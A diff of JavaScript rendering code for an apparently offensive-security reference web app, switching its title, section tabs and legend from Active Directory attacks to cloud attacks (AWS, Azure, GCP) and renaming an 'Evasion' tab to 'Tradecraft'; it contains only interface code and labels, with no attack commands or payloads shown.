-else if(S.s==='tru')flow=fTRU();else if(S.s==='kit')flow=fKIT();else if(S.s==='byp')flow=fBYP();
+if(S.s==='aim')flow=fAIM();else if(S.s==='aws')flow=fAWS();else if(S.s==='eid')flow=fEID();
+else if(S.s==='azs')flow=fAZS();else if(S.s==='gcp')flow=fGCP();else if(S.s==='fed')flow=fFED();
+else if(S.s==='per')flow=fPER();else if(S.s==='kit')flow=fKIT();else if(S.s==='byp')flow=fBYP();
 var chtml=codes.length===0?'<div style="color:#4b5563;padding:16px;text-align:center">No code examples.</div>':
 codes.map(function(c,i){return'<div class="cp" data-ci="'+i+'"><button class="ct2"><span class="cv">&#9654;</span><span class="tl">'+c.t+'</span>'+T(c.l,"#6b7280",1)+'</button></div>'}).join('');
 var thtml=tricks.length===0?'':
-'<div style="font-size:.68em;font-weight:800;color:#f97316;letter-spacing:.08em;margin-bottom:6px">EVASION / TRADECRAFT</div>'+
+'<div style="font-size:.68em;font-weight:800;color:#f97316;letter-spacing:.08em;margin-bottom:6px">TRADECRAFT / EVASION</div>'+
 tricks.map(function(t,i){return'<div class="ti" data-ti="'+i+'"><button class="tt"><span class="cv" style="color:#f97316;font-size:10px">&#9654;</span><span class="tn">'+t.t+'</span></button></div>'}).join('');
 var pv=si>0?'<button class="nb2" data-nv="'+SE[si-1].id+'">\u2190 '+SE[si-1].l+'</button>':'';
 var nx=si<SE.length-1?'<button class="nb2" data-nv="'+SE[si+1].id+'">'+SE[si+1].l+' \u2192</button>':'';
 $('#app').innerHTML=
-'<div class="hd"><div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;margin-bottom:6px"><div><h1>Active Directory Attacks Reference</h1><div class="sub">Enumeration \u2022 Kerberos \u2022 ACL Abuse \u2022 Credentials \u2022 GPO \u2022 ADCS/PKI \u2022 Trusts \u2022 Toolkit \u2022 Bypasses</div></div></div><div class="st">'+
+'<div class="hd"><div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;margin-bottom:6px"><div><h1>Cloud Attacks Reference</h1><div class="sub">AWS IAM \u2022 AWS Services \u2022 Azure/Entra \u2022 Azure Services \u2022 GCP \u2022 Multi-Cloud \u2022 Persistence \u2022 Toolkit \u2022 Bypasses</div></div></div><div class="st">'+
 SE.map(function(s){return'<button class="sb'+(S.s===s.id?' on':'')+'" style="'+(S.s===s.id?'color:'+s.c+';border-bottom-color:'+s.c:'')+'" data-sc="'+s.id+'">'+s.i+' '+s.l+'</button>'}).join('')+
-'</div></div><div class="ut"><button class="ub'+(S.t==='flow'?' on':'')+'" data-tb="flow">\u{1F4CA} Flow</button><button class="ub'+(S.t==='code'?' on':'')+'" data-tb="code">\u{1F4BB} Code'+(codes.length?' <span class="cnt">'+codes.length+'</span>':'')+'</button><button class="ub'+(S.t==='tricks'?' on':'')+'" data-tb="tricks">\u{1F512} Evasion'+(tricks.length?' <span class="cnt">'+tricks.length+'</span>':'')+'</button></div>'+
+'</div></div><div class="ut"><button class="ub'+(S.t==='flow'?' on':'')+'" data-tb="flow">\u{1F4CA} Flow</button><button class="ub'+(S.t==='code'?' on':'')+'" data-tb="code">\u{1F4BB} Code'+(codes.length?' <span class="cnt">'+codes.length+'</span>':'')+'</button><button class="ub'+(S.t==='tricks'?' on':'')+'" data-tb="tricks">\u{1F512} Tradecraft'+(tricks.length?' <span class="cnt">'+tricks.length+'</span>':'')+'</button></div>'+
 '<div class="ct"><div style="display:flex;align-items:center;gap:6px;margin-bottom:6px"><span style="font-size:1em">'+so.i+'</span><h2 style="font-size:.9em;font-weight:700">'+so.l+'</h2>'+T(so.l,so.c)+'<div style="margin-left:auto;display:flex;gap:3px">'+pv+nx+'</div></div>'+
 '<div id="tf" style="'+(S.t!=='flow'?'display:none':'')+'">'+flow+'</div>'+
 '<div id="tc" style="'+(S.t!=='code'?'display:none':'')+'">'+chtml+'</div>'+
 '<div id="tt" style="'+(S.t!=='tricks'?'display:none':'')+'">'+thtml+'</div></div>'+
-'<div class="ft">'+[{c:"#60a5fa",l:"Enumeration"},{c:"#fbbf24",l:"Kerberos"},{c:"#f87171",l:"ACL Abuse"},{c:"#a78bfa",l:"Credentials"},{c:"#34d399",l:"GPO"},{c:"#e879f9",l:"ADCS/PKI"},{c:"#f59e0b",l:"Trusts"},{c:"#f472b6",l:"Toolkit"},{c:"#fb923c",l:"Bypasses"}].map(function(x){return'<div style="display:flex;align-items:center;gap:3px"><span class="dt" style="background:'+x.c+'"></span><span style="color:#4b5563">'+x.l+'</span></div>'}).join('')+'</div>';
+'<div class="ft">'+[{c:"#f59e0b",l:"AWS IAM"},{c:"#f87171",l:"AWS Services"},{c:"#60a5fa",l:"Azure/Entra"},{c:"#a78bfa",l:"Azure Svc"},{c:"#34d399",l:"GCP"},{c:"#e879f9",l:"Multi-Cloud"},{c:"#fbbf24",l:"Persistence"},{c:"#f472b6",l:"Toolkit"},{c:"#fb923c",l:"Bypasses"}].map(function(x){return'<div style="display:flex;align-items:center;gap:3px"><span class="dt" style="background:'+x.c+'"></span><span style="color:#4b5563">'+x.l+'</span></div>'}).join('')+'</div>';
 $$('[data-sc]').forEach(function(b){b.onclick=function(){S.s=b.dataset.sc;S.t='flow';render()}});
 $$('[data-tb]').forEach(function(b){b.onclick=function(){S.t=b.dataset.tb;render()}});
 $$('[data-nv]').forEach(function(b){b.onclick=function(){S.s=b.dataset.nv;S.t='flow';render()}});
